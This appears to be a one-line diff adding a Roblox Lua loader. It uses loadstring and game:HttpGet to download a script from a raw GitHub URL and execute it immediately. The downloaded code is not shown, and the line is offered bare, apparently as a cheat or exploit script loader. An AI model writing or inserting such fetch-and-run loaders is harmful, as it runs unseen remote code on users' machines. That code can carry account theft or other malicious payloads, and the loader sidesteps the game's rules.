@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mentos4/Roblox/refs/heads/main/Main"))()
